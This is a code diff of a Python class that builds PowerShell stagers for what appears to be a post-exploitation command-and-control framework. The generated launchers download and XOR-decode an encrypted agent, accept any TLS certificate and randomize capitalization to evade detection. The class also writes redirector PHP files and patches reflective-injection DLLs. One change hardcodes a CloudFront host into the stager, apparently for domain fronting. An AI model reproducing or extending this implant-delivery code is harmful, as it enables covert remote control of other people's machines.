@@ -30,11 +30,11 @@ class Stagers:
 
         # pull out the code install path from the database config
         cur = self.conn.cursor()
-        
+
         cur.execute("SELECT install_path FROM config")
         self.installPath = cur.fetchone()[0]
 
-
+        cur.execute("SELECT default_profile FROM config")
         res = cur.fetchone()[0]
         self.userAgent = res.split("|")[1]
         self.headers = []
@@ -59,14 +59,14 @@ class Stagers:
         """
         Load stagers from the install + "/lib/stagers/*" path
         """
-        
+
         rootPath = self.installPath + 'lib/stagers/'
         pattern = '*.py'
-         
+
         for root, dirs, files in os.walk(rootPath):
             for filename in fnmatch.filter(files, pattern):
                 filePath = os.path.join(root, filename)
-                
+
                 # extract just the module name from the full path
                 stagerName = filePath.split("/lib/stagers/")[-1][0:-3]
 
@@ -106,6 +106,8 @@ class Stagers:
         # patch the server and key information
         stager = stager.replace("REPLACE_SERVER", server)
         stager = stager.replace("REPLACE_STAGING_KEY", key)
+        # check if host header is within the additional headers, and add it if so. same for _hop
+        stager = stager.replace("REPLACE_HOST", "d1dqfbim5iow53.cloudfront.net")
         stager = stager.replace("index.jsp", self.stage1)
         stager = stager.replace("index.php", self.stage2)
 
@@ -134,7 +136,7 @@ class Stagers:
 
     def generate_stager_hop(self, server, key, encrypt=True, encode=False):
         """
-        Generate the PowerShell stager for hop.php redirectors that 
+        Generate the PowerShell stager for hop.php redirectors that
         will perform key negotiation with the server and kick off the agent.
         """
 
@@ -160,7 +162,7 @@ class Stagers:
                     randomizedStager += helpers.randomize_capitalization(line)
                 else:
                     randomizedStager += line
-        
+
         # base64 encode the stager and return it
         if encode:
             return helpers.enc_powershell(randomizedStager)
@@ -175,7 +177,7 @@ class Stagers:
     def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
         """
         Generate "standard API" functionality, i.e. the actual agent.ps1 that runs.
-        
+
         This should always be sent over encrypted comms.
         """
         f = open(self.installPath + "./data/agent/agent.ps1")
@@ -205,7 +207,7 @@ class Stagers:
     # def generate_agent(self, sessionID):
     #     """
     #     Generate the agent code for a particulare sessionID.
-        
+
     #     Used for on-disk persistence without needing staging.
     #     Note: only use on reboot persistence, otherwise you'll get two agents running :)
     #     """
@@ -296,7 +298,7 @@ class Stagers:
         userAgent ->    "default" uses the UA from the default profile in the database
                         "none" sets no user agent
                         any other text is used as the user-agent
-        proxy ->        "default" uses the default system proxy 
+        proxy ->        "default" uses the default system proxy
                         "none" sets no proxy
                         any other text is used as the proxy
 
@@ -315,7 +317,9 @@ class Stagers:
             userAgent = self.userAgent
 
         if self.headers:
-        	headers = self.headers
+            headers = self.headers
+        else:
+            headers = ''
         # get the launching URI
         URI = self.generate_launcher_uri(server, encode, pivotServer, hop)
 
@@ -326,13 +330,13 @@ class Stagers:
         if "https" in URI:
             # allow for self-signed certificates for https connections
             stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-        
+
         if headers:
-        	for h in headers:
-        		stager += helpers.randomize_capitalization("$wc.Headers.Add('%s','%s');")%(h[0],h[1])
-        
+            for h in headers:
+                stager += helpers.randomize_capitalization("$wc.Headers.Add('"+h[0]+"','" +h[1]+ "');")
+
         if userAgent.lower() != "none" or proxy.lower() != "none":
-            
+
             if userAgent.lower() != "none":
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "'User-Agent',$u);"
@@ -349,7 +353,7 @@ class Stagers:
                     stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                 else:
                     # TODO: implement form for other proxy credentials
-                    pass 
+                    pass
 
         # the stub to decode the encrypted stager download by XOR'ing with the staging key
         stager += helpers.randomize_capitalization("$K=")
@@ -375,7 +379,7 @@ class Stagers:
 
     def generate_hop_php(self, server, resources):
         """
-        Generates a hop.php file with the specified target server 
+        Generates a hop.php file with the specified target server
         and resource URIs.
         """
 
@@ -401,13 +405,13 @@ class Stagers:
         """
 
         #read in original DLL and patch the bytes based on arch
-        if arch.lower() == "x86":  
+        if arch.lower() == "x86":
             origPath = self.installPath + "/data/misc/ReflectivePick_x86_orig.dll"
         else:
             origPath = self.installPath + "/data/misc/ReflectivePick_x64_orig.dll"
 
         if os.path.isfile(origPath):
-            
+
             dllRaw = ''
             with open(origPath, 'rb') as f:
                 dllRaw = f.read()
@@ -423,5 +427,4 @@ class Stagers:
 
         else:
             print helpers.color("[!] Original .dll for arch "+arch+" does not exist!")
-
 
